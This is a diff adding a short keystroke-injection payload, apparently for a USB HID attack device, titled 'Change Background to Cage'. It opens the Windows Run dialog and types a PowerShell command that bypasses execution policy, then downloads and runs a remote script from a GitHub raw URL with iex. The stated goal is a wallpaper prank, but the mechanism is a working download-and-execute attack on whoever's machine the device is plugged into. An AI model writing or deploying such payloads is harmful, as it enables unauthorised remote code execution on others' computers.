@@ -1,0 +1,5 @@
+<name>Change Background to Cage
+<press>gui+r
+<d>200
+<type>powershell -ExecutionPolicy unrestricted -Command "iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexbgreat/cbkg/master/change.ps1'))"
+<press>enter
